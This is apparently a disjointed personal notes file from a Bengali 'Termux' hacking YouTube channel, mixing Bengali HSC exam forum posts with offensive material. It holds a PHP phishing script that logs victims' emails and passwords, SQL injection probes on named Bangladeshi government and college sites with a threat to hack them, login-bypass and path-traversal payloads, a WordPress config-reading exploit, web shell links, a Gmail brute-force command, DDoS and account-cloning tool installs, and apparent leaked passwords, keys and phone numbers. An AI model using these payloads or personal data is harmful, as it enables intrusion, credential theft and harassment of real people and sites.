+
+
+
+
+
+http://www.futuraplastic.com/select.php
+
+
+[1] belbana, 3AMGz4dfNRUteaZfbeng
+
+
+https://youtu.be/YKLX3QbKBg0
+
+
+Hashes.com
+
+ Proceeded!
+
+1 hashes were checked: 1 found 0 not found
+
+ Found:
+
+25a41cec631264f04815eda23dc6edd
+
+http://esjindex.org/search.php?id=1
+
+
+cyber71: https://drive.google.com/drive/u/0/mobile/folders/1--ZD_j8sOZdPnvqXbmPD2DYfSLSVKdgn?usp=sharing
+
+
+[1] 25a41cec631264f04815eda23dc6edd9
+
+
+![Screenshot_20200902-190322](https://user-images.githubusercontent.com/57522482/92684934-2dbeb080-f326-11ea-8975-0695bd306723.png)
+
+
+
+
+
+
+apt update 
+
+apt-get install aircrack-ng
+
+apt install net-tools
+
+apt install python python2 git 
+
+git clone https://github.com/derv82/wifite
+
+cd wifite
+
+python2 wifite.py
+
+apt install python-pip
+
+https://­drive.google.com/­drive/folders/­1aG5UhtCGMN20G-N_xPBq­W2hdaqW6IFfv?fbclid=­IwAR2OKCLhggSDXVEkZi­wVy-zVChJfnZVjK7nHW_­1wytm1zbDIAXyORE49NU­k
+
+
+
+
+
+greenlet, dnspython, monotonic, eventlet, colorama
+
+
+
+
+
+আপনার Termux এর আগের 
+সব টুল ডিলিট হয়ে যাবে তাই বুঝে,  
+ইন্সটল করেন।
+
+okkk lest 
+
+
+
+map api AIzaSyBGLI4HnSwpWgRRUY6OX0A3mu0r1QIujOg
+
+ip 2641a9861b8c42cb845ba0ee7aa761c0
+
+
+
+
+
+
+
+ng 1h5F1L9W0xc5AwDLXu2vvtzUWGk_3v2GQVWECx3eCndyBAYZB
+
+
+lolcat
+git config --global user.name "Your Name"
+
+git config --global user.email "you@example.com"
+
+https://www.thedailystar.net/bangla/শীর্ষ-খবর/বাংলাদেশের-২৪-লাখ-মানুষ-বন্যায়-ক্ষতিগ্রস্ত-ও-১৩-লাখ-শিশু-ঝুঁকিতে-ইউনিসেফ-163933
+
+
+  [Admin দয়া করে পোস্টটি approve কইরেন]
+
+www.bcinterioradhdclinic.com/adminLogin.php
+
+https://translate.google.com
+http://www.latursahodaya.com/school_reg.php
+
+★ "বাংলাদেশের ২৪ লাখ মানুষ বন্যায় ক্ষতিগ্রস্ত।-ইউনিসেফ"
+★ করোনার পরিস্থিতি তো সবারই জানা!😊
+
+★আপনি ভালো আছেন, আপনার পরিবারের কোনো ক্ষতি হয়নি একটা বার শুকরিয়া আদায় করেন আল্লাহর কাছে।  
+★ যে শিক্ষা অর্জন শুধু মাত্র স্বার্থপরতা ও শুধু নিজেকে নিয়েই ভাবতে শিখায় সে শিক্ষা অর্জন থেকে বর্জন করা শ্রেষ্ঠ। 
+
+★ আলহামদুলিল্লাহ,  আমার নিজের উপর কনফিডেন্স আছে। যেকোনো অবস্থায় পরীক্ষা দিলে সব বিষয়ে ৩৩ পাওয়ার মত যৌগ্যতা আমার আছে।
+
+★ করোনায় যারা ক্ষতিগ্রস্থ হয়েছে তাদের কথা বাদেই দিলাম। বন্যায় ক্ষতিগ্রস্থ ২৪ লাখের মধ্যে ১ লাখ hsc পরীক্ষার্থীর পরিবার হবে?.....  ওকে ১ হাজার তো হবে..?? এই ১হাজার পরীক্ষার্থীর কি কোনো স্বপ্ন নেই? ছিলো না? 
+
+★ আপনারা যারা "এক্সাম  হোক " এই নিয়ে আন্দোলন করতেছেন আমি মানছি আপনারা ভালো মেধাবী শিক্ষার্থী। 
+
+★ আচ্ছা এক্সম না হলে আপনাদের সব স্বপ্ন ভেঙ্গে যাবে তাই না?? কিন্তু কেন? hsc certificate  দিয়ে আপনার কোন লেবেলের স্বপ্ন থাকতে পারে আমার জানা নেই। 
+★ "auto pass হলেও তো varsity তে এডমিশন টেষ্ট দেওয়া যাবে" তাই না? যদি এইরকম টা হয়, তাহলে আপনি HSC রেজাল্ট বা certificate নিয়ে কি স্বপ্ন দেখতেন...??? 
+আমি যতদূর জানি ১ম, ২য় ও ৩য় স্তরের চাকরিতে hsc pass এর certificate  er  কোনো   ভ্যালু নেই। তাহলে কি আপনার স্বপ্ন ৪র্থ স্তরের চাকরি? 
+
+ নাকি,এটা..??
+  এখন পরীক্ষা হইলে যে ২০% শিক্ষার্থী পাস করবে, সেটা আপনি জানেন। আর এর মধ্যে আপনি A+ পেয়ে গেলেন।  বিষয়টা অনেক  সম্মানজনক তাই না? পরিবারের সাবাই আপনাকে মাথায় তুলে নাচবে, ... মোবাইল, বাইক, ইত্যাদি গিফট পাবেন পরিবার থেকে। কলেজের সকল স্যাররা আপনার প্রশংসা করবে।  
+আর এদিকে ৮০% শিক্ষার্থী কান্না করবে। এটাই তো আপনার স্বপ্ন তাই না...? যদি এটি না হয় তাহলে আটো পাস নিয়ে এত দ্বিমত থাকতে পারে না।😊
+
+★ বন্যায় যে যে HSC শিক্ষার্থীর বাসস্থান শুধু ঘরের চাল বা গাছের উপর তারা কি ভাবে hsc xm এর জন্য প্রস্তুতি নিবে? 
+আমি বিশ্বাস করি জানুয়ারি ফেব্রুয়ারি তে তাদের বা আমাদের প্রস্তুতি অনেক ভালো ছিলো। 
+
+★ নিজের দিকটা ভাবলে হবে না ১৫ লাখ শিক্ষার্থীর বিষয়ে ভাবতে হবে। আপনার স্বপ্ন যেমন ৪র্থ লেবের চাকরি বা নিচু মানসিকতার স্বপ্ন তেমনি, বন্যায় ও করোনার কারণে প্রস্তুতি হারিয়ে ফেলা শিক্ষার্থীর স্বপ্ন, যেন পরীক্ষা দিতে না হয়।
+
+
+★ এই গ্রুপটি মিডিয়ার নজরে আসার আগে এই গ্রুপে অটো পাস চেয়ে পোস্ট করা হতো। তখন কিন্তু কেউ-ই "অটো পাস চাই না" এই রকম পোস্ট করতোনা। গ্রুপটি মিডিয়াতে যাবে এই মূহুর্তে আমাদের দাবি পরিবর্তন কারতে হয়। তারপর থেকে আমাদের আন্দোলন হয় "করোনার মধ্যে hsc নয়" আলহামদুলিল্লাহ আমারা সফল।  
+কিন্তু কিছু দিন আগে "সময় টিবি" তাদের ওয়েব সাইটে একটি ভোটের ব্যবস্তা করে। 
+•সেপ্টেম্বরের মধ্যে পরীক্ষা নেওয়া হোক! 
+তারপর ৯৫% "না" ভোট পেয়েছে। আর ৫%"হ্যা" ভোট পেয়েছে। 
+এই ৫% ভাইরাস যখন দেখলো প্রধানমন্ত্রী আটোপাশের ইঙ্গিত দিয়েছেন তখনই এই ৫% শিক্ষার্থী ভাইরাস হয়ে আমাদের গ্রুপে এসেছে।  তারাই শুধু নিজেদের স্বার্থের বিষয়ে ভেবে একাধারে পোস্ট করে যাচ্ছে যেনো অটোপাস না হয়। 
+
+গ্রপে অধিকাংশ শিক্ষার্থী অটোপাস চায়।
+তাই আমি মনে করি "অটোপাস চাই না" এইরকম পোস্ট যদি Approved না করা হয়, তাহলে এই গ্রুপে ২টি দল তৈরী হবে না। 
+
+আর আমাদের আন্দোলন "করোনায়  hsc নয়" সফল হবে। তানাহলে শুধু সবাই যুক্তি দিয়ে "আটোপাস চাই" আর "আটোপাস চাই না" এই রকম পোস্ট করে আমাদের মূল  আন্দোলনকে থামিয়ে দিবে। 
+তাই  admin এর কাছে পর্যাপ্ত রিকোয়েস্ট থাকবে বিষয়টি ভেবে দেখার জন্য😊
+
+[ভুল বললে ক্ষমা করবেন ]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php
+include 'ip.php';
+
+file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location:https://movie.newscall24.com/bir-bangla-movie-download');
+exit();
+
+
+
+
+▄█ █▀█
+
+
+
+\e[0m\n"︎
+
+Published on May 26, 2020
+
+👉info@support.facebook.com
+
+
+👉Subject: You can't use Facebook at the moment 
+
+
+👉Dear Facebook Help Team, I have not been able to login to my ID for a long time. It is very important for me to login to my account. This account open very urgent, my all family members Miss me & I miss my all family. Everyone is scared now because of the covid-19 and I can't find my family. I proof this account owner attached my original National I'd card, All details matches my Facebook profile. Please login permission very important this time.
+
+
+
+
+
+
+
+http://dhosting4okcs22v.onion/
+
+https://mvss.in/gallery.php?id=6
+http://www.tasmimart.in/post.php?id=4
+https://nsdl.co.in/post.php
+
+
+https://github.com/badshahsarfraz/Mark
+
+
+
+
+★ http://www.gdc.gov.bd/page.php?id=1%27--+
+★ http://www.noakhalicoll.gov.bd/page.php?id=15%27--+
+★ http://kyanc.edu.bd/page.php?id=10%27--+
+★ http://nwu.edu.bd/news_details.php?id=35%27%27--+
+
+সাইট গুলো টার্গেট করলাম।😊 আমাদের Auto Pass নাদিলে hack করে ফেলবো  Kosom...!!!😡
+
+
+
+
+
+একজন বলেছিল নিজেকে ছাড়া আর কাউকে বিশ্বাস করে না। 
+বাট আমি তখন 
+
+
+
+
+https://ntwinvestigations.com/adminc/welcome.php
+
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+
+
+
+
+http://proprintidaho.com/cgi-bin/filechucker.cgi?action=uploadcomplete&serial=51883aff6818caeac53fe1c02ce3c091a307901b&numfiles=1&elapsedsecs=2&totalsize=132193&somefileswereblocked=&f1name=shell0.php&f1urlpath=%2fHgf%2f&f1size=131455&
+
+
+ >>>>>>>>>Termux Bangla YT <<<<<<<<<
+                        sᴜʙsᴄʀɪʙᴇ ᴍᴇ
+                                ᵖᵉᵃˢᵉ
+  q     ᐯIᗪᗴO ᗰᗩKᗴ: ᗩᗷᗰ ᗰᑌᒍᗩᕼIᗪ
+
+
+★Google Dok: inurl:/cgi-bin/filechucker.cgi
+
+★ Shell link: https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/r57.php
+
+★ All Shell: https://github.com/backdoorhub/shell-backdoor-list
+
+
+★ Sandro Proxy: https://m.apkpure.com/sandroproxy/org.sandroproxy
+
+★ lighting Browser: https://play.google.com/store/apps/details?id=acr.browser.barebones
+
+~~~~~~~~~~🅣︎🅗︎🅐︎🅝︎🅚︎🅢︎~~~~~~~~~~
+
+ https://pastebin.com/PZxB2YD5
+
+https://github.com/sachin175638/jdash
+button add : https://drive.google.com/file/d/1NT18_gXFXBBHEfsGkJpf-TgTQYyYZM7Y/view?usp=drivesdk
+
+
+Date of Birth Change: https://m.facebook.com/help/contact/233841356784195
+
+
+injection Code: ' or 1=1 limit 1 -- -+ 1'or'1'='1 'or' '=' 
+
+
+
+
+
+
+
+
+
+http://localhost:5848/r57.php
+
+
+
+
+&Abm675689
+
+
+
+
+
+
+Published on Jun 11, 2019
+
+Coomand -- 
+
+hydra -l termuxbanglayt@gmail.com -P /sdcard/abm.txt -s 465 -S -v -V -t 10 smtp.gmail.com smtp
+
+❤️support us❤️
+
+
+  1'or'1'='1
+
+'or' '='
+
+' or 1=1 limit 1 -- -+
+' or 1=1 limit 1 -- -+
+1'or'1'='1
+
+
+phonespoloit : https://pastebin.com/jrNfWK9R
+
+
+inurl:/in.wp-content/admin-ajax.php?
+
+Dork : inurl:/wp-content/plugins/revslider/
+
+Exploit : wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+
+Login Mysql : Https://phpmyadmin.dreamhost.com/?hostname=mysql.(target.com)
+
+
+
+
+http://www.mobible.lk/admin_login.php
+http://aark.us/admin_login.php
+https://www.desktopit.com/admin_login.php
+https://ntwinvestigations.com/adminc/admin_login.php
+http://www.kiangmok.com/admin/admin_login.php
+https://saantrade.in/admin_login.php
+
+
+
+
+
+
+
+
+
+
+
+https://pastebin.com/vqY0WQfg
+
+cc: https://pastebin.com/CsXT4Fwv
+
+
+termux bangla yt, Termux Bangla YT,  Termux bangla yt, Termux Bangla YouTube, termux bangla youtube, TechPur BD, tech pur bd,  Tech Pur bd, Termux banglaYt, Termux bangla, termux bangla,  Termux Bangla,  Termuxbangla, termuxbangla, Abm Mujahid, Abm Mojahid, Abm mujahid,  abm mujahid, abmpur bd, abm pur bd, cce8, 
+
+tobstar :: snowgoofy
+admin :: lawyerscks
+
+
+
+https://github.com/vanhauser-thc/thc- 
+01hydra
+git clone https://github.com/toxic-ig/Trity
+i679965@kksm.be 55336688%%
+bibajh@honeys.be 553366%%
+https://www.facebook.com/profile.php?id=100023667459198
+434231
+https://github.com/AhmadRiswanto704/comarsh
+printf "\e[1;93m[\e[0m"
+
+
+
+\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n"
+https://pastebin.com/raw/cL54Q7J7
+
+f("\033[1;37;40m \033[2;37:40m TextColour BlackBackground          TextColour GreyBackground                WhiteText ColouredBackground\033[0;37;40m\n")
+print f("\033[1;30;40m Dark Gray      \033[0m 1;30;40m            \033[0;30;47m Black      \033[0m 0;30;47m               \033[0;37;41m Black      \033[0m 0;37;41m")
+print("\033[1;31;40m Bright Red     \033[0m 1;31;40m            \033[0;31;47m Red        \033[0m 0;31;47m               \033[0;37;42m Black      \033[0m 0;37;42m")
+print("\033[1;32;40m Bright Green   \033[0m 1;32;40m            \033[0;32;47m Green      \033[0m 0;32;47m               \033[0;37;43m Black      \033[0m 0;37;43m")
+print("\033[1;33;40m Yellow         \033[0m 1;33;40m            \033[0;33;47m Brown      \033[0m 0;33;47m               \033[0;37;44m Black      \033[0m 0;37;44m")
+print("\033[1;34;40m Bright Blue    \033[0m 1;34;40m            \033[0;34;47m Blue       \033[0m 0;34;47m               \033[0;37;45m Black      \033[0m 0;37;45m")
+print("\033[1;35;40m Bright Magenta \033[0m 1;35;40m            \033[0;35;47m Magenta    \033[0m 0;35;47m               \033[0;37;46m Black      \033[0m 0;37;46m")
+print("\033[1;36;40m Bright Cyan    \033[0m 1;36;40m            \033[0;36;47m Cyan       \033[0m 0;36;47m               \033[0;37;47m Black      \033[0m 0;37;47m")
+print("\033[1;37;40m White          \033[0m 1;37;40m            \033[0;37;40m Light Grey \033[0m 0;37;40m               \033[0;37;48m Black      \033[0m 0;37;48m")
+ 
+
+
+
+
+https://github.com/HardyTomas/DDos-Attack-OVH-
+apt-get install aircrack-ng
+
+apt upgrade && apt update && git clone https://github.com/verluchie/dost-attack
+
+ovh
+
+
+https://github.com/FajarTheGGman/F-Tools
+*** https://github.com/mikechabot/smtp-email-spoofer-py
+
+ apt upgrade && apt update && pkg install python python2 git bash -y && git clone https://github.com/shawarkhanethicalhacker/D-TECT-1.git
+
+apt upgrade && apt update && git clone https://github.com/shawarkhanethicalhacker/D-TECT
+
+
+
+Termux Bangla YouTube, Termux Bangla YT, Termux Bangla, termux bangla yt, termux bangla,  techpur bd, tech pur bd, techpur, Abm Mujahid, abm mujhid, abm mojahid, cce8, abmpur bd, abm pur bd, techpurbd, termuxbanglayt, abmmujahid, 
+
+https://github.com/rocky/python-uncompyle6
+
+https://github.com/Ha3MrX/DDos-Attack
+
+
+
+python setup.py install
+
+https://github.com/Moham3dRiahi/Th3inspector
+cpan install HTTP::Request
+
+https://github.com/Manisso/fsociety
+
+pkg update && pkg upgrade -y
+
+pkg install figlet cowsay toilet
+
+pkg install php wget
+
+pkg install git curl
+
+pkg install python
+
+pkg install python2
+
+pip2 install requests
+
+pip2 install machanize
+
+pkg install bash
+
+pkg install termcolor ruby
+
+pkg install openssh openssl
+
+pkg install ruby
+
+gem install lolcat
+
+https://github.com/xEHx/Tools-v1
+
+
+
+⏩Hi,  I am Abm Mujahid. This is Termux Bangla YouTube Channel. [Old Name TechPur BD]
+
+
+
+✴ Ok Guys,  👉Subscribe 👈 This Channel To Learn Cyber Security. 
+
+📨Mail: abmmojahid@gmail.com
+
+🔑Chennel Keyword: Termux Bangla, Bangla Termux, Termux Bd, termux bd, Abm Mujahid, Abm Mojahid, TechPur BD, Tech Pur bd, abmpur, abm pur bd, abm pur, cyber Security, 
+
+⚠ Disclaimer: All of today's video content is for educational use only. This video contains no spam, metadata, violence, or advocating any kind of dangerous acts, defaming any person, group or group, or making any obscene comment.
+
+
+
+
+🔎 Video Tittle:
+
+
+◼ Video Description: 
+
+
+__________________________________________
+ ⤵⤵⤵⤵⤵⤵⤵⤵⤵⤵⤵    
+🔨Tool Install Link:
+
+
+⚠ Termux Download Link: https://play.google.com/store/apps/details?id=com.termux
+
+▶     ✳✳✳✳✳✳✳✳✳✳✳✳✳✳✳✳✳✳    ◀
+
+★Contract Me:
+
+🚩Facebook Page: https://m.Facebook.com/hackerabm
+
+🔥Facebook ID: https://m.Facebook.com/abmmujahid.official
+
+☎Whatsapp: +8801706434237
+
+🌍Website: https://www.techpur.tk
+__________________________________________
+
+▶Termux A-Z Basic: Wait coming 
+
+▶Old ID Cloning Ep.1:htps://youtu.be/xwuQuQrWm10
+▶Old ID Cloning Ep.2: https://youtu.be/HQ-pc3LWSA0
+▶Old ID Cloning Ep.3: https://youtu.be/UxbrtZPD_h0
+▶Old ID Cloning Ep.4: https://youtu.be/4TY8ImZI5oY
+▶Old ID Cloning Ep.5: https://youtu.be/ejcvh37PvVY
+✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴
+
+🔎Video Tag: 
+
+
+-----------------pur
+
+
+----------------------------------------------
+▶ #CCE8, #Abm_Mujahid, #Tech_Pur_BD
+------------------------------------------------------------------
+
+🔑Chennel Keyword: Termux Bangla, Bangla Termux, Termux Bd, termux bd, Abm Mujahid, Abm Mojahid, TechPur BD, Tech Pur bd, abm, abm pur bd, abm pur, 
+------------------------------------------------------------------
+⚠ Copyright Disclaimer:
+Under Section 107 of the Copyright Act 1976, allowance is made for Fair Use' for purposes such as criticism, comment, news reporting, teaching, scholarship, and research, Fair use is a ptgermitted by copyright statute that might otherwise be infringing,Non profit, educational or personal use tips the balance in favor of fair use.
+
+⭕ DISCLAIMER: This Channel DOES NOT Promote or encourage Any illegal activities , all contents provided by This Channel is meant for EDUCATIONAL PURPOSE only.
+
+⭕ Disclaimer: All of today's video content is for educational use only. This video contains no spam, metadata, violence, or advocating any kind of dangerous acts, defaming any person, group or group, or making any obscene comment.
+
+⭕ Disclaimer: The main objectives of this video are to protect and make people aware of the harmful, fraudulent, confusing apps, websites and tools from the public and to the public. All the videos in this channel are used for educational purposes. All the videos in this channel are scared of anyone Or business is not intended for any purpose.
+------------------------------------------------------------------
+
+                         ᴛʜᴀɴᴋs💔🌹🌷
+
+                  🅢︎🅤︎🅑︎🅢︎🅒︎🅡︎🅘︎🅑︎🅔︎ 
+
+------------------------------------------------------------------
+  
+This Video All Clip Credit By:-
+(1) Pexels Download Video:-https://videos.pexels.com
+(2) Pixabay Download Video:-https://pixabay.com/videos/
+(3) Videvo Download Video:-https://www.videvo.net
+(4) Videezy Download Video:-https://www.videezy.com
+(5) Coverr Download Video:-http://www.coverr.co
+(6)Dtemstime Download video:-https://www.dreamstime.com/stock-photos
+(7)shutterstock Download Video:- https://www.shutterstock.com/
+
+Copyright Disclaimer:
+Under Section 107 of the Copyright Act 1976, allowance is made for Fair Use' for purposes such as criticism, comment, news reporting, teaching, scholarship, and research, Fair use is a ptgermitted by copyright statute that might otherwise be infringing,Non profit, educational or personal use tips the balance in favor of fair use.
+
+Sobuz Bangla Youtube Helpline Facebook Group Link :- https://www.facebook.com/groups/65621...
+
+Sobuz Bangla TV official Blog website link :-https://sobuzbanglatv.blogspot.com
+
+Sobuz Biplop Sobuz Facebook Page Link :- https://www.facebook.com/Sobuz-biplop...
+
+Sobuz Bangla TV App Link :- http://app.appsgeyser.com/9895061/Sob...
+
+
+Crack Pak	 ║ [ NO LOGIN REQUIRED ] 		╚════════════╝ ╔═══════════════════════════════════════════╗ ║ Pakistani 7 DIGIT Facebook Account Cloner ║ ╚═══════════════════════════════════════════╝ ╔══════════════════════════╗ ║ INSTALLATION COMMANDS ║ ║══════════════════════════╝ ╚═ apt update ╚═ apt install git python python2 -y ╚═ git clone https://github.com/htr-tech/crackpak ╚═ cd crackpak ╚═ python2 crack.py ╔════════════════════════╗ ║ USERNAME : cra3k ║ ║ PASSWORD : acc0unt ║ ╚════════════════════════╝
+
+
+
+
+
+
+apt update 
+pkg install python python2 git -y
+git clone https://github.com/htr-tech/crackpak
+cd crackpak
+
+USERNAME : cra3k
+PASSWORD : acc0unt 
+
+
+
+
+
+https://github.com/Ekultek/Zeus-Scanner
+
+
+
+
+
+1. apt update 
+2. pkg install git python python2 -y 
+3. git clone https://github.com/htr-tech/pakcrack.git 
+4. cd pakcrack  
+5. python2 crack.py 
+
+USERNAME : cra3k
+PASSWORD : acc0unt
+
+
+বর্তমান সময়ে একটা বিষয় নিয়ে এই গ্রুপে অনেক ঝড় উঠেছে। আর সেই বিষয়টি হচ্ছে #অটো_প্রমোশন। [এডমিনের কাছে আমার পর্যাপ্ত রিকোয়েস্ট, পোস্টটি approv করার জন্য]
+এই পোস্টে সব যৌক্তিক বিষয় গুলো বিশ্লেষণ করার চেষ্টা করবো। 
+★ hsc এক্সমের রেজাল্টকে কেন্দ্র করে একটি শিক্ষার্থীর ভালো একটা ভবিষ্যৎ নির্ধারণের একটি সুযোগ পায়।(ভার্সিটিতে এডমিশন এর বিষয়ে বলা হয়েছে) 
+★ ভার্সিটির এডমিশন টেষ্টে জয়েন্ট হওয়াটা সম্পূর্ণ নির্ধারণ করে আমাদের SSC+HSC এর পয়েন্টের উপর। আমি যতদূর জানি দুটি মিলিয়ে ৭ পয়েন্ট লাগে(মানবিক)। এর মানে যারা ssc ও hsc GPA 5 বা Golden A+ [hsc+ssc=10 পয়েন্ট] পেয়েছে তারাও যেমন অংশগ্রহন করতে পারবে ঠিক যাদের দুটি মিলিয়ে ৭ পয়েন্ট হবে তারাও অংশগ্রহন করতে পারবে..! (বুয়েট চুইয়েটের বিষয় এখানে অানবো না) তো hsc -তে  যারা A+ পায় তারাই যে শুধু ভার্সিটিতে Allow হতে পারে এমনটা কিন্তু না! দুটি মিলিয়ে যাদের পয়েন্ট ৭ তারাও কিন্তু ভার্সিটিতে Allow হতে পারতেছে। আবার দুটি মিলিয়ে ১০ পয়েন্ট নিয়েও কোনো জায়গায় allow হয় না।
+
+★ আপনার কমনসেন্সে হয়তো জানে যারা অন্যের খাতা দেখে লিখে তারা হয়তো পাশ করতে পারে কিন্তু ভালো রেজাল্ট করতে পারে না। তার নিজের উপর একটা কনফিডেন্স থাকে যে থাকে দিয়ে ভার্সিটি হবে না।
+
+★ " অটো পাশ চাই না " এটা নিয়ে emotional পোস্ট করতেছে বেশি যারা improve দিতেচেয়েছিল। আচ্ছা আপনি কি sure? আপনি improve দিলেই আপনি ভালো করতে পারবেন? আমি অনেক দেখেছি ৭৮-৭৭ পেয়ে  improve দিয়েও ৬৬-৬৭ পায়। আচ্ছা ধরে নিলাম  improve দিয়ে আপনি ভালো রেজাল্ট করলেন।  তো এখন কি আপনি নিশ্চিত আপনি বুয়েট বা মেডিকেলে allow হবেন.???
+ যদি আপনার উত্তর "no" হয়,  তাহলে ঠিক আছে। 
+আর যদি আপনার উত্তর  "yes" হয়,  তহলে আমি একটি প্রশ্ন করবো,  আপনার এতই কনফিডেন্সে যখন,  তো আপনাকে improve দিতে হচ্ছে কেন? 
+[আপনারা আটো পাস চান না,  এইরকম পোস্ট বা আন্দোলন না করে,  আপনাদের উপর শিক্ষা মন্ত্রণালয়ের দৃষ্টি আকর্ষণ করার মতো পোস্ট করে, যেন আপনাদেরও সুযোগ দেওয়া হয় ভার্সিটির এডমিশনের জন্য]
+★ আমাদের ব্যাচের যারা আটোপাস চান না, তাদের কাছে আমাদের পর্যাপ্ত রিকোয়েস্ট থাকবে, দয়া করে আর ৫ টা মাস অপেক্ষা করুন, 1 April এ করোনার পরিস্থিতি স্বাভাবিক থাকলে, ছোট ভাইদের সাথে HSC xm টা দিয়ে দিয়েন।  এখন থেকে ভালো করে প্রস্থতি নেন।
+★ আমরা আর পারতেসি না,  আমাদের ভার্সিটি এডমিশনের জন্য ভালো করে প্রস্তুতি নিতে হবে। প্রস্তুতি নিতে লাইব্রেরী থেকে বই কিনে ও অনলাইন এই যথেষ্ট বলে মনে করি আমি।  
+Admin Plzz Approve😭😭😭😭
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://192.168.0.1
+
+103.127.57.250
+
+
+Invisible symbol ( ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎)
+
+01723089900
+
+https://github.com/Cyser-Inc/Phising-Game-Online
+
+
+
+Dear Faceook Team , This Fake Page Goes Against Facebook Comunity.They Are using Fake information Of Public Figure Like as Name Posts Information Picture etc. So I request Sir. Removed This Page
+
+
+
+6. I also Provided Both Page of link Fake imposter And Real Page. You can Both Page Information Name.Then Take decsion I hope you can Understand My sitiuation Removed Fake Page
+
+
+
+https://github.com/VaimpierOfficial/vaim-metasploit-installation
+
+git clone https://github.com/Lulz3xploit/LittleBrother 
+cd LittleBrother 
+python3 -m pip install -r 
+
+
+⭕ A͎b͎m͎ M͎u͎j͎a͎h͎i͎d͎ 👈
+
+Pass: abm123-9, abm456-9, abm789, abm112233, abm445566, 
+
+🔗01706434237
+
+pass: 434237
+
+
+
+
+AbM%%56@@++
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+───▄************************
+        *█▀█▀█       🅵︎: /ᕼᗩᑕKᗴᖇᗩᗷᗰ   *
+        *█▄█▄█       🆆︎: 01706434237  *
+        *─███──▄▄    🆈︎: ᴛᴇᴄʜᴘᴜʀʙᴅ    *
+        *─████▐█─█      🅂🅄🄱🅂🄲🅁🄸🄱🄴    *
+        *─████───█                   *
+        *─▀▀▀▀▀▀▀         🆃🅴🅲🅷🅿🆄🆁🅱🅳  *
+        *░█████╗░██████╗░███╗░░░███╗ *
+        *██╔══██╗██╔══██╗████╗░████║ *
+        *███████║██████╦╝██╔████╔██║ *
+        *██╔══██║██╔══██╗██║╚██╔╝██║ *
+        *██║░░██║██████╦╝██║░╚═╝░██║ *
+        *╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝ *
+        ******************************
+
+
+https://youtu.be/UxbrtZPD_h0
+
+git clone https://github.com/BotolMehedi/bhot
+
+pip2 install requests mechanize
+
+https://github.com/htr-tech/Reverse-Engineering
+
+https://www.facebook.com/mohammad.saifu.984
+
+*░█████╗░██████╗░███╗░░░███╗ *
+        *██╔══██╗██╔══██╗████╗░████║ *
+        *███████║██████╦╝██╔████╔██║ *
+        *██╔══██║██╔══██╗██║╚██╔╝██║ *
+        *██║░░██║██████╦╝██║░╚═╝░██║ *
+        *╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝ *
+
+
+
+
+
+
+
+
+12-03-172
+7214747009333
+
+
+https://github.com/Fukur0-3XP/Spoof
+
+
+
+
+
+ঠিকানা: বাসা/হোল্ডিং: বিষ্ণপুর, গ্রাম/রাস্তা: বিষ্ণপুর, ডাকঘর: বিষ্ণপুর - ২৪৮০, কেন্দুয়া,
+নেত্রকোনা
+
+
+https://www.facebook.com/profile.php?id=100046773743424
+
+
+
+https://m.facebook.com/help/contact/209046679279097
+
+Dear Facebook,
+Looking at the date of birth in this account, we understand that it is a child's account. This account has violated the rules of Facebook, so remove the account from Facebook.
+Thanks Facebook Team
+
+
+
+
+
+install libcaca
+cacafire
+
+
+
+TermuX BanGla 
+exampleabm@gmail.com
+
+1.Cloning 
+2.remembering
+3.diseble.
+4, hack
+
+
+&&&%%%349058AbM***
+
+
+
+
+
+Ager num cilo... 01933822001
+New nun... 01736115593
+
+https://m.facebook.com/help/contact/209046679279097?ref=u2u&_rdc=1&_rdr
+
+https://m.facebook.com/help/contact/209046679279097
+
+
+
+
+
+
+
+
+https://github.com/Binyamin-binni/b-phish
+
+inurl:/cgi-bin/filechucker.cgi
+
+
+
+
+
+
+
+
+
+
++8801959699853|.. rifatrachude.chude 9699853
+
+
+firoj.miya.1023   4523855
+
+
+
+https://www.facebook.com/afrojtasnim.odhora.9
